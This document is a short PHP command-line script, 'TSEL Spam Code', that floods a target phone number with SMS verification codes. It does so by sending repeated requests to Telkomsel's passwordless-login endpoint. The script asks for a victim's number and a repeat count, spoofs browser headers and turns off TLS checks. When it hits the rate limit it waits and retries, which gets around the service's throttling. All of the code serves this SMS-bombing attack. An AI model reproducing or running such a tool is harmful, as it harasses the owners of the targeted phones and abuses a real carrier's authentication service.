<?php 
		TSEL Spam Code
Coded by : Yuan Sandra
Github : https://github.com/sandrayoan11
*/
echo "\e[93mTSEL Spam Code
\e[36m===========\e[91m>>>>>>>>>>\n\e[36mAuthor : Yuan Sandra
\e[36m===========\e[91m>>>>>>>>>>\n\e[36mJurusan : Teknik Informatika
\e[36m===========\e[91m>>>>>>>>>>\n\e[36mUniversitas : Uniska Banjarmasin
Github : https://github.com/sandrayoan11
\e[36m===========\e[91m>>>>>>>>>>";
echo "\n\e[36mNo Target (08xxxxxxxxxx): ";
$no = trim(fgets(STDIN, 1024));
echo "Count     : ";
$loop = trim(fgets(STDIN, 1024));
echo "\e[36m===========\e[91m>>>>>>>>>>\n\e[96m\e[5mResults:\n";
$no = '62'.substr(trim($no), 1);
for ($x=1; $x<=$loop; $x++) {
$c = curl_init();
curl_setopt($c, CURLOPT_URL, "https://tdwidm.telkomsel.com/passwordless/start");
curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_HTTPHEADER, array(
    'Auth0-Client: eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiNy42LjEifQ',
    'Origin: https://my.telkomsel.com',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: en-US,en;q=0.9',
    'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'Accept: application/json, text/javascripte',
    'Referer: https://my.telkomsel.com/',
    'Connection: keep-alive'
));
curl_setopt($c, CURLOPT_POSTFIELDS,"client_id=Xlj9pkfK6yYumf6G8KE2S5TDWgTtczb0&phone_number=%2B".$no."&connection=sms");
curl_setopt($c, CURLOPT_POST, 1);
$hasil = curl_exec($c);
if ($hasil == "Too Many Requests") {
$loop += 1;
echo "\e[91m$x. Code failed to send :(\n\e[97mCount +1\n".($loop-$x)." remaining\n\e[93mSleep in 60s\n";
flush();
sleep(60); 
} else {
echo "\e[92m$x. Code has been sent :)\n";
flush();
sleep(1); 
}
}
echo "\e[36m===========\e[91m>>>>>>>>>>\n";
echo "\e[92mTak ada sistem yang aman Thanks ^_^";
?>